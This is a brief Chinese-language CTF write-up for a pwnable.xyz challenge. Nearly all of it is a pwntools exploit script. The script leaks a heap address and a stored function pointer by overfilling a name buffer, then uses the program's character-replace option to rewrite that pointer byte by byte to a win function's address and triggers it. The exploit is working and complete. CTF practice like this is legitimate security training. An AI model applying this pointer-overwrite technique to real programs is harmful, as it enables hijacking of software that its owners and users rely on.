不难，并不是UAF题

知识点

- `char* strchrnul(char* str,int c);`



```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

p = remote('svc.pwnable.xyz', 30015)
# p = process('./challenge')


# 覆盖 0 ~ 0x7f
p.sendafter(b'Name: ', b' ')
p.sendlineafter(b'> ', b'2')
p.sendafter(b'Save name: ', b'a' * 0x80)


# 覆盖 0x80 ~ 0x87
p.sendlineafter(b'> ', b'4')
line = p.recvuntil(b'Menu:')
line = line[11+0x80:-6]
if len(line) < 8:
    gap = 8-len(line)
    line += p8(0) * gap
    heap_addr = u64(line)
    print('heap address:' + hex(heap_addr))
    for i in range(gap):
        p.sendlineafter(b'> ', b'5')
        p.sendlineafter(b'Char to replace: ', p8(0xff))
        p.sendlineafter(b'New char: ', b'a')


# 覆盖 0x88 ~ 0x8f
p.sendlineafter(b'> ', b'4')
origin_payload = p.recvuntil(b'Menu:')
origin_payload = origin_payload[11+0x80+8:-6]
print('origin payload', origin_payload, len(origin_payload))
tmp = origin_payload + p8(0)*(8-len(origin_payload))
calc_addr = u64(tmp)
print('calc address:' + hex(calc_addr))
win_addr = 0x400cf3
target_payload = p64(win_addr)
for i in range(len(origin_payload)):
    replace_c = origin_payload[i]
    new_c = target_payload[i]
    print('replace:' + str(replace_c) + ' -> ' + str(new_c))
    while True:
        p.sendlineafter(b'> ', b'5')
        p.sendlineafter(b'Char to replace: ', p8(replace_c))
        p.sendlineafter(b'New char: ', p8(new_c))
        p.sendlineafter(b'> ', b'4')
        new_payload = p.recvuntil(b'Menu:')
        new_payload = new_payload[11+0x80+8:-6]
        if new_payload[i] == new_c:
            break


# call win
# gdb.attach(p)
p.sendlineafter(b'> ', b'1')
p.interactive()

```

